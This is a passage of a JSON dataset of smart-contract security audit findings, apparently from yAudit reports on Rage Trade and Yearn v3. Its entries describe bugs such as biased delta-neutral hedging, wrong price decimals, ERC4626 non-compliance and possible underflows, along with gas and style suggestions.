        "body": "Rage Trade relies on providing liquidity to the GMX protocol for long exposure to WETH and WBTC. The GMX Vault is where all GMX protocol underlying assets are stored. The GMX vault has a target weight for each underlying asset, but the target weight is not the same as the current weight of the asset in the vault during a specific block. The actual weights of the tokens The Rage Trade rebalancing approach uses the ideal target weight, not the actual current weight of the asset. This means the Rage trade strategy is not actually delta neutral because it assumes an ideal mix of underlying assets when holding GLP and doesn't consider the current underlying assets. To demonstrate the issue, data was taken from the Arbitrum blockchain to plot the exposure that Rage Trade has had to the underlying assets WETH and WBTC since around the time that the delta neutral strategy began receiving funds. The short exposure takes the form of WETH or WBTC borrowed from Aave. To calculate this percentage, the amount of WETH or WBTC borrowed was multiplied by the price of the asset and then divided by the total value of GLP held by the Rage trade strategy. The short exposure does a good job of targeting the 35% and 15% marks for WETH and WBTC respectively. The 35% and 15% marks are the target allocations for the GMX vault to hold of WETH and WBTC. The long exposure takes the form of GLP, which holds roughly 50% stablecoins and 50% WETH and WBTC. The data for the exposure to WETH and WBTC was taken from at stats.gmx.io during the same period as the short position exposure chart. The comparison of the short and long exposure to WETH and WBTC is shown below. As the charts demonstrate, since the deployment of Rage Trade in December 2022, the GMX vault, and therefore GLP, has consistently held more WBTC and less WETH than the GMX vault target weights. But the Rage Trade short positions do not reflect this, and instead use the target weights to determine the ideal short exposure to these assets. In its current form, Rage Trade has held a position of long WBTC and short WETH since it was deployed. Examining the asset exposure in the GMX Vault over the entire duration of GMX's history, it is more apparent how far the asset allocations can stray from the target. The second figure below focuses on the less volatile period of GMX asset allocation in 2022 to provide a closer look at how different the asset allocation is from the 35% WETH and 15% WBTC targets. Since June 2022, the GMX vault has mostly been overweight in WBTC and underweight in WETH, but sometimes it is overweight in both assets. Focusing on more \"extreme\" changes in the asset allocations of the vault, the vault held a total of 39.4% in WETH and WBTC combined on May 26 2022, but that rose to 54% on July 24 2022, less than 2 months later. If this strategy was active at this time, it would have had too large of a short position and too small of a long position. It is true that during this time the value of WETH and WBTC dropped by around 22%, so in actuality these months would have been profitable for this strategy, but a reverse scenario where the assets increased by 22% in value would have left the strategy at a loss. Even if the above scenario where the strategy is weighted in the wrong direction of market movements does not occur, another risk is if the correlation between WETH and WBTC prices change significantly. It's possible there is an implied assumption that WETH and WBTC prices are correlated, so as long as the sum of allocations WETH and WBTC in the GMX vault is roughly 50% of the GMX vault, then the long position should neutralize the short position. But if the WETH/WBTC price correlation changes while they GMX vault allocations are not near the targets, this could be problematic. The chart from CoinGecko shows this ratio over the last two years and demonstrates that it can easily change by 10% or more in a short timespan. In summary, the risk this issue highlights includes: strategy losses from when WETH and WBTC positions are overweighted towards a long position and the prices of these assets drops. The reverse can also happen, where WETH and WBTC positions are underweighted towards a long position and the prices of these assets rises. strategy losses from when WETH and WBTC weights in the GMX vault are not at the target weights and the WETH/WBTC price ratio changes in the wrong direction from how the GMX vault (and therefore the Rage Trade strategy) is weighted.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Junior vault getPriceX128() has wrong decimals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The term X128 as used in Uniswap documentation indicates a Q128 value. This means that the value should be divided by 1 << 128 to get the actual value that it represents. Examining getPriceX128() in the junior vault finds a problem. The return value is aum.mulDiv(1 << 128, totalSupply * 1e24). This is similar to the previous junior vault example. aum is 1E12, but the denominator is totalSupply of 1E18 multiplied by 1E24. This leaves the numerator with 1E12 but the denominator with 1E42, the resulting values is not correct. When the value of getPriceX128() in the existing on-chain deployment is divided by 1 << 128, the resulting value is 8.34E-13. In contrast, the price of GLP is $0.834 and the return value of getPrice(bool) in the junior vault with 18 decimals like GLP is 0.834E18. We can apply the same approach to getPriceX128() in the senior vault and find that it is implemented correctly. We can double check the decimals of the return value price.mulDiv(1 << 128, 1e8). price is 1E8 and it is divided by 1E8, so the price value is properly multiplied by 1 << 128. We can also confirm the decimals in getPrice(bool) in the junior vault are correct. The price value is documented in GMX docs: The sell price would be getAum(false) / glpSupply getPrice(bool) returns aum.mulDivDown(PRICE_PRECISION, totalSupply * 1e24). aum is 1E12, PRICE_PRECISION is 1E30, totalSupply is 1E18 and it is multiplied by 1E24. This results in 1E12 * 1E30 / (1E18 * 1E24) = 1E42 / 1E42 = 1. And because GLP has a decimals value of 18, the value is returned with 18 decimals. The return value can be confirmed against the GLP price in the GMX frontend.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. maxWithdraw() and maxRedeem() are inaccurate if Aave pool doesn't permit withdrawals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "EIP4626 states the following requirements for maxRedeem(): Maximum amount of Vault shares that can be redeemed from the owner balance in the Vault, through a redeem call. MUST return the maximum amount of shares that could be transferred from owner through redeem and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0. If an Aave pool is paused or inactive, maxWithdraw() and maxRedeem() in the senior vault should return zero. The functions currently do not. Currently the senior vault is not compliant with the ERC4626 spec if the Aave pool is inactive or paused. maxMint() and maxDeposit() should also have a similar change.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. maxMint() and maxDeposit() are inaccurate if Aave pool is frozen",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "EIP4626 states the following requirements for maxMint(): MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset. MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0. If an Aave pool is frozen, Aave documentation states it will not accept deposits. Therefore maxMint() and maxDeposit() should return zero in this case. The functions currently do not. Currently the senior vault is not compliant with the ERC4626 spec if the Aave pool is frozen.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. setGmxParams() doesn't update dependent variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The value state.glpManager can be updated in setGmxParams() by the owner. The value state.gmxVault is set in initialize() by calling vault() in state.glpManager. When state.glpManager is updated, the value state.gmxVault is not updated, which may leave the gmx vault variable outdated.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Biased delta neutral position",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The junior vault attempts to hold equal long and short positions to maintain a delta neutral position in the market. The reason this is done is to avoid impermanent loss, which is a common problem for liquidity providers. The junior vault holds a short position by borrowing WETH and WBTC from Aave (after depositing USDC to maintain a reasonable health factor). The junior vault holds an equal long position by holding GLP (technically fsGLP, the staked version of GLP) which consists of a basket of underlying assets mostly consistently of WETH, WBTC and stablecoins. There are two small ways in which the Rage Trade delta neutral strategy has bias in its holdings that could create unwanted exposure to certain assets. A consistent bias over the long run can impact yield returns to depositors because impermanent loss may cause losses in the long run. The GLP vault does not hold exactly 50% WETH & WBTC with the remaining 50% in stablecoins. It targets a holding of 1% LINK and 1% UNI, so in reality the targeted exposure is 35% WETH, 15% WBTC, 1% UNI, 1% LINK, and 50% stablecoins. The delta neutral strategy has no short position to cover the long exposure held in UNI or LINK. Although the percentage of UNI and LINK holdings is small, this exposure can result in non-zero impermanent loss over the long run. If there is an assumption that UNI and LINK prices are correlated to WETH and WBTC, then the value of the short positions should be increased to roughly 52% of the GLP value, rather than the currently targeted 50%. LINK is an asset that can be borrowed and shorted on Aave like WETH and WBTC currently are, an approach which would maintain a more precise neutral position. The second bias is that the process that rebalances the junior vault holdings consistently has more long exposure than short. This can be seen on the long timescale where the ratio is targeting 2 (the reason the target ratio is 2 and not 1 is because only 50% of the holdings in the GMX vault are WETH and WBTC) but the actual value is consistently above 2. Zooming in on the shorter timescale, observe the point in time when a rebalance happens in the middle of this plot. While the rebalance brings the ratio closer to 2, it could do better, and this inaccuracy may be due to an inaccuracy in the implementation's math.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Make functions external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "Make getVaultMarketValue() in the senior vault and the junior vault external, not public. The same can be done for getPriceX128() in the senior vault and the junior vault. getPriceX128() in the senior vault includes a comment that it is only used in the frontend.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Immutable variables are cheaper",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "pool can be immutable for gas savings.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Remove unused function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "getMaxVariableBorrowRate() is not used in any contracts in the Rage Trade repo and can be removed.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Remove duplicate length check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The array length check in _executeFlashloan() is unnecessary because it is duplicated a few lines later when the Balancer vault flashloan() call happens.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Unnecessary addition operation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "usdcBorrowed is zero at the start of totalUsdcBorrowed(), so the line can be changed to: - if (address(leveragePool) != address(0)) usdcBorrowed += leveragePool.getUsdcBorrowed(); + if (address(leveragePool) != address(0)) usdcBorrowed = leveragePool.getUsdcBorrowed();",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. No way to remove approvals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "grantAllowances() in the junior vault and senior vault exists solely to set the allowances for the vault, even though these are set in the initializer(). It may also be useful to have a way to remove these allowances. For example, if the Aave pool address is updated or there is a security concern with an approved contract, it may be useful to remove the approval. But there is currently no ability to do this with the vaults. This ability may be useful to introduce because a paused vault will not prevent tokens from being withdrawn by an approved address when an infinite allowance is set.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Move Aave pool and oracle update to new function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The second half of setHedgeParams() is unrelated to the first half and may not be necessary to use each time the other state variables are updated. Consider moving the second half of setHedgeParams() to a separate function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Unused dependencies imported",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The WadRayMath import from Aave V3 is never used by DnGmxJuniorVault. The same applies to IRewardTracker.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Hypothetical revert condition breaks EIP4626 requirements",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "EIP4626 states totalAssets() has the requirement that it MUST NOT revert. But in the senior vault, the call flow totalAssets() -> totalUsdcBorrowed() -> dnGmxJuniorVault.getUsdcBorrowed() -> .toInt256() calls a SafeCast function that could revert if the uint256 value in getUsdcBorrowed() is greater than or equal to 2**255. It is unlikely that Rage Trade will hold this much value, which would equate to 2**249 dollars of value, but totalAssets() would revert in such a case.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "There are many instances of magic numbers with powers of ten. Consider replacing these magic numbers with a constant internal variable, which is already done in some cases like PRICE_PRECISION. Some examples are these magic numbers 1e12, 1e14, 1e16, and 1e30.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Unnecessary reimplementation of GMX functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "The junior vault's getPrice() and the junior vault manager's _getGlpPrice() functions are identical other than the different of the state function argument. Furthermore, these functions reimplement a function named getPrice() in GlpManager that returns the GLP price. In fact, the return value and decimals of the junior vault's getPrice() and getPrice() in GlpManager is identical, so arguably the function isn't needed at all and the GlpManager contract can be called directly when needed. The same applies to the first half of _getGlpPriceInUsdc() in the junior vault manager.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Library functions with unusual visibility",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "A library is slightly different than a contract in that the functions in a library are only accessible to the contract that imports the library. This means the junior vault manager library can remove any external functions that are declared external in the library but are not called by the junior vault (which is the only contract that imports the library). Such functions include getTokenReservesInGlp(), rebalanceBorrow(), getTokenPrice(), getGlpPrice(), getGlpPriceInUsdc(), getTokenPriceInUsdc(), getLiquidationThreshold(), flashloanAmounts(), getOptimalCappedBorrows(), getTokenReservesInGlp(), and isWithinAllowedDelta(). Another change that could be made with the library is combining external and internal functions if the external function only calls the internal function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Functions altering state variables missing events",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "Some functions that modify state variables do not emit events: updateFeeStrategyParams() unstakeAndVestEsGmx() stopVestAndStakeEsGmx() claimVestedGmx()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Dead link in ERC4626Upgradeable.sol comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "This link points to a repo that no longer exists.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Move excessUtilizationRate calculation in calculateFeeSplit() into if statement",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-RageTrade.md",
        "body": "This line can be moved inside the if statement.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Inaccurate rounding from maximize",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "There are two locations where mulDivDown() uses _getGlpPriceInUsdc(state, maximize) in the denominator and one place where _getGlpPriceInUsdc(state, !maximize) is in the denominator. This inconsistency indicates a bug. If a fraction is intended to be maximized (with maximize set to true), then the denominator should be reduced (with maximize set to false). If the fraction is intended to be minimized (with maximize set to false), then the denominator should be increased (with maximize set to true). This indicates that the correct value of maximize when it is used in the denominator is inverted from the value it holds in the current function. The two cases where this is not done, line 1140 and line 1146, should be fixed to align to line 1172.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Loss of precision can lead to loss of value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "The calculation of minTokenOut in _convertToToken() is done in a way where the value is reduced to 6 decimals of precision, then increased to the number of decimals needed for that specific token. This process means that all digits beyond the first 6 decimals of precision will be zeros. This effectively rounds down the value, which increases the amount of possible slippage from the value targeted by the slippageThreshold value. This could result in minor loss of value.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Possible underflow could cause revert",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "A comment in _executeVaultUserBatchStake() attempts to explain why _roundUsdcBalance will be always >= _usdcToConvert, but the logic does not hold up. Take the following example scenario. Starting values: usdcAmountToConvert = 1 _roundUsdcBalance = 2 minUsdcConversionAmount = 4 Logical steps After line 388: _usdcToConvert = 1 After line 397: _usdcToConvert = 4 _roundUsdcBalance - _usdcToConvert will underflow on line 399 because _roundUsdcBalance = 2 while _usdcToConvert = 4 The same logic is found in DnGmxBatchingManagerGlp.sol.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Cannot undo infinite approval",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "grantAllowances() in the batching managers gives an infinite approval of sGLP to dnGmxJuniorVault, but there is no way to undo this approval. It may be useful to add a function argument to grantAllowances() to allow a custom approval value to be set, including an approval of zero. While the batching managers are implemented behind proxies, in the event that the approval needs to be removed, response time will likely be important so it is preferable to have failsafes in place before they are needed. Because dnGmxJuniorVault is implemented behind a proxy, the code at that address today may differ from the code at that address in the future, making safety measures more important.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. abs() reverts for type(int256).min",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "The abs() implementation in SignedFixedPointMathLib is not from OpenZeppelin's SignedMath. OpenZeppelin's code has a comment indicating unchecked must be used to support the argument value of type(int256).min. The current abs() implementation reverts on this value. Because mulDivDown() relies on this abs() implementation, it too would revert in the case of x == type(int256).min.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Missing assert risks casting overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "_calculateSwapLoss() contains two casting operations where a value is negated. In the second case, it is clear that the negation will make tokenAmount positive because tokenAmount is less than zero in that code branch. But in the first case, it is not clear that the negation will make otherTokenAmount positive rather than negative. _calculateSwapLoss() is called with values returned from QuoterLib.quoteCombinedSwap(). quoteCombinedSwap() contains an assert that validates ethAmountInEthSwap and usdcAmountInEthSwap have opposite signs. But there is no similar check to confirm btcAmountInBtcSwap and usdcAmountInBtcSwap have opposite signs. This means the _calculateSwapLoss() call with BTC values may have a chance of a casting overflow because there is no assertion to guarantee avoidance of this case.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Combine zero checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "In batching manager, when executeBatch() is called it checks if the function argument is zero and then later checks if a value derived from the argument is zero. The first check can be removed, because if the function argument is zero it will be caught in the second check. The same logic is in DnGmxBatchingManagerGlp.sol.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "There is at least one example where unchecked can be applied, because the line before the subtraction prevents an underflow: - userDeposit.unclaimedShares = userUnclaimedShares - amount.toUint128(); + unchecked { userDeposit.unclaimedShares = userUnclaimedShares - amount.toUint128(); } The same modification could be made to DnGmxBatchingManagerGlp.sol.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Use cached value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "userDeposit.usdcBalance is cached in userUsdcBalance in depositUsdc(). This cached value can be used instead of userDeposit.usdcBalance on line 225. This optimization is already used later in the same contract. The same edit can be made in DnGmxBatchingManagerGlp.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Remove unused functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "simulateSwap() with 4 function arguments is not used anywhere and can safely be removed from Simulate.sol to save some gas on deployment. The onlyDnGmxJuniorVault modifier is declared in DnGmxBatchingManager and DnGmxBatchingManagerGlp but is never used in Rage Trade. These modifier declarations can be removed.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Consider refactoring",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "_getMaxTokenHedgeAmount() is nearly identical to _getTokenHedgeAmount(). The only difference is in the last line of these functions. _getTokenHedgeAmount() could be replaced with _getMaxTokenHedgeAmount() * _traderOIHedgeBps / MAX_BPS.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Update and improve comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "Several improvements can be made in comments: DnGmxBatchingManagerGlp.sol now handles USDC instead of GLP. Many comments still reference GLP but should now mention USDC. For example, this comment and this comment in depositUsdc() should say USDC not sGLP. There are other comments that also need updating to reflect the switch to using USDC. slippageThresholdGmxBps in DnGmxBatchingManager is used for USDC slippage but also WETH slippage in rescueFees(). This comment only mentions USDC but should mention WETH. _getMaxTokenHedgeAmount() is nearly identical to _getTokenHedgeAmount() but the comments of the two functions are identical. The difference is that _getTokenHedgeAmount() returns a value multiplied by _traderOIHedgeBps. This difference in not reflect in the comments of the function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Efficiency improvement",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "The tokenTraderOIMax function argument for the function _checkTokenHedgeAmount() is returned from _getMaxTokenHedgeAmount(). This returned value should always be positive. This means tokenTraderOIMax.sign() == 1, so _checkTokenHedgeAmount() can be simplified with the following: function _checkTokenHedgeAmount(int256 tokenTraderOIHedge, int256 tokenTraderOIMax) internal pure returns (bool) { - if (tokenTraderOIHedge.sign() * tokenTraderOIMax.sign() < 0) return false; + if (tokenTraderOIHedge.sign() < 0) return false; - if (tokenTraderOIHedge.abs() > tokenTraderOIMax.abs()) return false; + if (tokenTraderOIHedge > tokenTraderOIMax) return false; return true; }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Migration requires managing slot reuse",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "In DnGmxBatchingManager.sol, the glpDepositPendingThreshold variable in the old contract version is renamed to minUsdcConversionAmount in the new contract version. This storage slot used to store an amount of GLP but now stores an amount of USDC. If the logic contract behind the proxy is upgraded before this storage slot value is changed, a well-timed attack may be able to take advantage of the incorrect value. Similarly, the deprecated variables should be set to zero before the upgrade. While roundGlpDepositPending is already set to zero, the private bypass variable is not, so setBypass() should be called before the upgrade, otherwise the variable will remain set. batchingManager in",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Use updated solmate import",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "Consider replacing the outdated reference in package.json and multiple solidity files to use the current location of the solmate library. This will help to ensure the latest bug fixes and improvements are used.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Possible mulDivDown confusion",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "Consider renaming the custom mulDivDown() implementation to indicate the first argument is a int256, not a uint256 like the solmate implementation of mulDivDown(). One place where this ambiguity may cause confusion is this line. Solidity will prevent an underflow from happening, so the solmate implementation will be used if no revert happens, but should an underflow be allowed here with unchecked to allow the custom implementation to be used?",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Unnecessary operations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "This line unnecessarily casts netSlippage to uint256 when it is already of that type. This line emits an event with the constant value of address(0). Because this event is used in only this one location, there is no point in this event taking a constant value.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Change variable name",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "The variables name unhedgedGlp is used in two places in DnGmxJuniorVaultManager. Only the second case of this variable actually refers to the exact value of unhedged GLP maintained by Rage Trade, while the first case actually refers to the target amount of unhedged GLP that the protocol should rebalance to.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Missing NatSpec comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "Several variables and functions could benefit from improved NatSpec: depositCap: add the comment \"Maximum USDC that can be deposited in one round\" depositCap: add the comment \"Maximum sGLP that can be deposited in one round\" depositUsdc(), executeBatch(), claimAndRedeem(), rescueFees(), and all internal functions are missing NatSpec in DnGmxBatchingManager.sol. batchingManager variable in State struct should be marked as deprecated because batching manager integration was removed. _getBorrowValue() should have a comment to specify the return value is in USDC not USD",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Typos in comments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-RageTrade-Upgrade.md",
        "body": "These typos were found in comments: cooldowm -> cooldown depoists -> deposits roudn -> round accumuated -> accumulated mangager -> manager cooldowm -> cooldown depoists -> deposits roudn -> round accumuated -> accumulated flase -> false (found here, here, here, and here) glp price in usd -> glp price in usdc (found here and here) againts -> against assests -> assets retunrs -> returns",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Vault should mint exactly the specified number of shares",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "Shares are minted by first converting the shares argument to assets using the _convert_to_assets() function with the option to round up the calculation. The assets variable is then forwarded to the internal function _deposit(), which takes this amount and recalculates the number of shares in the _issue_shares_for_amount() function. This breaks the compliance with EIP-4626, as the mint() function is expected to mint the receiver the exact number of shares: Mints exactly shares Vault shares to receiver by depositing assets of underlying tokens.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Non-compliance with ERC4626 Withdrawal Standard",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "See: EIP-4626 The methods used in both the v3 vault and the v3 strategy are to convert assets into shares and to burn this number of shares. If any losses occur, the number of assets to be sent back is currently reduced. However, this approach does not align with the ERC4626 protocol. Instead, more shares should be burned to match the requested number of assets. https://github.com/yearn/yearn-vaults-v3/blob/3e51c08d88d2764b39348c98f20e18c51b475722/contracts/VaultV3.vy#L1523 https://github.com/yearn/tokenized-strategy/blob/72a71b16088f1a7821f299aa013d824b3dbb8d4e/src/TokenizedStrategy.sol#L464",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. set_open_role() might only be used for a single role while putting at risk all the others",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "VaultV3.vy#L1255-L1275",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. lastReport() function does not return timestamp of last report for all cases",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The implementation of lastReport() returns the value of the last_profit_update storage variable. This timestamp is handled during the call to process_report() but is only updated if shares are burned (line 425) or if there are locked shares after logic is executed (line 1139).",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Use a two step process to update the management account",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The implementation of the setManagement() function performs the role transfer in a single step, by directly transferring this key role to the specified account.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Strategy deposit limits should be checked on the receiver account",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "The implementation of the deposit() and mint() functions check for deposit limits on the caller (msg.sender) account. The EIP-4626 standard specifies that these limits should be queried for the receiver account. Taking the maxDeposit function as an example, the specification states: Maximum amount of the underlying asset that can be deposited into the Vault for the receiver, through a deposit call.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Strategy may allow to redeem more assets than the available limit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
        "body": "In order to calculate the maximum number of shares that can be minted, the implementation of maxRedeem() takes the amount of assets specified by availableWithdrawLimit() and calculates the associated number of shares by using previewWithdraw(), which uses up rounding. The resulting number of shares can then be used in redeem() to withdraw assets according to the calculation of previewRedeem(). This double rounding may, under certain circumstances, result in more assets than the original limit specified by availableWithdrawLimit().",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Inconsistent rounding of losses_user_share",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-Yearn-v3.md",
